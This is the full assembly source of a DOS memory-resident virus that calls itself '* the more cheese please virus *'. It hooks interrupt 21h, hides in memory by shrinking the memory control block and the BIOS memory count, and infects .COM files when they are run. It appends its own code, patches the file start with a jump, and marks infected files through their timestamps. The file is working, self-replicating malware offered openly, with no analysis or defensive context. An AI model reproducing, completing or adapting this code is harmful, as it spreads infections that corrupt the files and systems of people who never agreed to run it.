   ; To assemble use TASM!

   jumps
   smart
   .radix 16

   code            segment byte public
                   assume  cs:code, ds:code, es:code, ss:code

                   org     100

   vir_size        equ     (code_end-code_start)
   mem_size        equ     (mem_end-code_start)

   code_start:

           call    get
   get:
           pop bp
           sub bp,offset get

                   xor     bx,bx
                   mov     ds,bx
                   cmp     word ptr ds:[415],'XX'   ; are we already resident ??
                   je      skip

                   mov     ax,cs
                   dec     ax
                   mov     ds,ax                    ; ds = MCB

                   cmp     byte ptr ds:[0],'Z'      ; is it the last MCB, if so
                   jne     skip                     ; all mem above here is free
                   mov     ax,(mem_size+0f)/10      ; virus size in paragrafs ..
                   push    ax
                   mov     ax,(mem_size+3ff)/400    ; virus size in kays ..
                   push    ds
                   mov     ds,bx
                   sub     word ptr ds:[413],ax     ; mem in kays (int 12)
                   mov     word ptr ds:[415],'XX'   ; yeah .. we're resident ..
                   pop     ds
                   pop     ax
                   sub     word ptr ds:[0003],ax    ; memblock size in paragrafs
                   mov     ax,cs
                   add     ax,ds:[0003]             ; get start of free memory
                   mov     es,ax

                   mov     ax,cs
                   mov     ds,ax

           mov     cx,(vir_size+1)/2        ; copy virus to memory ..
           mov di,100
           mov si,offset code_start
           add si,bp
           rep     movsw

                   mov     ds,bx                    ; get old int 21 address ..
                   mov     si,21*4
                   mov     di,offset es:old_21h
                   movsw
                   movsw

                   cli                              ; readdress int 21
                   mov     ax,offset es:new_int21
                   mov     word ptr ds:[21*4],ax
                   mov     ax,es
                   mov     word ptr ds:[21*4+2],ax
                   sti

   skip:
                   mov     ax,cs
                   mov     ds,ax
                   mov     es,ax

                   mov si,offset header         ; restore old .com header ..
                   add si,bp
                   mov     di,100
                   push    di
                   mov     cx,3
                   movsw
                   movsb

           retn                             ; return control to proggie.

   virus_name      db      '* the more cheese please virus *'

   int_21          macro
                   pushf
                   call    dword ptr cs:old_21h
                   endm


   new_int21:
           cmp     ax,4B00                  ; load and execute
           jz      infect

                   jmp     bail_out

   infect:
                   push    ax                       ; save registers ..
                   push    bx
                   push    cx
                   push    dx
                   push    di
                   push    si
           push    ds
                   push    es

   ;               mov     ah,19                    ; you could uncomment these
   ;               int_21                           ; lines and it will only
   ;               cmp     al,6                     ; infect on drive=al
   ;               jne     hejda                    ; (al=6 indicates drive g:)
                                                    ; (good to set to ram-disks!)


                   mov     ax,3d00                  ; open phile ..
                   int_21
                   xchg    bx,ax                    ; phile handle to bx ..

                   push    bx                       ; save phile handle ..
                   mov     ax,1220h                 ; get job file table
                   int     2Fh
                   mov     bl,es:[di]
                   xor     bh,bh
                   mov     ax,1216h                 ; get system file table
                   int     2Fh                      ; entry to es:di
                   pop     bx                       ; restore phile handle ..

                   mov     ax,cs
                   mov     ds,ax                    ; ds = current segment ..

                   cmp     num_infected,10
                   je      hejda

                   push    bx                       ; save handle

                   mov     ax,1220                  ; get job file table ..
                   int     2f                       ; bx = phile handle ..
                   xor     bh,bh
                   mov     bl,es:[di]               ; bx = job file table #
                   mov     ax,1216
                   int     2f                       ; ed:di = sft

                   pop     bx                       ; retrieve phile handle ..

                   mov     ax,word ptr es:[di+0dh]  ; get file time
                   mov     cx,ax

                   and     cl,00011111b             ; are we infected ??
                   cmp     cl,00000001b
                   je      close

                   and     al,11100000b             ; infection marker ..
                   or      al,00000001b

                   mov     file_time,ax
                   mov     ax,es:[di+0f]            ; and date ..
                   mov     file_date,ax

                   mov     ax,es:[di+11]            ; get file size
                   mov     f_size,ax

                   cmp     ax,64000d                ; to big to handle ??
                   ja      close

           mov     ah,3F                    ; read the first 3 bytes ..
                   mov     cx,3
           mov dx,offset header
                   int_21

                   mov     si,offset header         ; check if .exe phile ..
                   cmp     [si],'MZ'
                   je      infect_exe
                   cmp     [si],'ZM'
                   je      infect_exe

                   mov     word ptr es:[di+2],2     ; set to read/write mode ..

                   push    es                       ; save sft ..
                   push    di

                   mov     ax,cs                    ; copy virus to temp_buffer
                   mov     es,ax
                   mov     di,offset v_buffer
                   mov     si,offset code_start
                   mov     cx,(vir_size+1)/2
                   rep     movsw

                   pop     di                       ; restore sft ..
                   pop     es

                   mov     ax,f_size                ; move to end of phile
                   mov     es:[di+15],ax

           mov     ah,40                    ; copy virus code to end of
           mov     cx,vir_size              ; phile ..
           mov dx,offset v_buffer
                   int_21

                   xor     ax,ax                    ; move to top of phile ..
                   mov     es:[di+15],ax

           mov     ah,40                    ; and write the jump ..
                   mov     cx,3
                   sub     f_size,cx                ; correct jump size
           mov dx,offset the_jump
                   int_21


   infect_exe:
                   mov     dx,file_date             ; restore old time and date
                   mov     cx,file_time
                   mov     ax,5701
                   int_21

                   inc     num_infected

   close:

                   mov     ah,3E                    ; close the phile, please ..
                   int_21

   hejda:

                   pop     es                       ; restore registers ..
                   pop     ds
                   pop     si
                   pop     di
                   pop     dx
                   pop     cx
                   pop     bx
                   pop     ax

   bail_out:       db      0ea
   old_21h         dw      0,0

   the_jump        db      0e9
   f_size          dw      0

   header          db      0cdh,20,0

   num_infected    db      0

   code_end:

   file_time       dw      ?
   file_date       dw      ?

   v_buffer        db      (vir_size+1) dup (?)
   e_buffer        db      100 dup (?)
   d_buffer        db      100 dup (?)

   mem_end:

   code            ends
   end             code_start
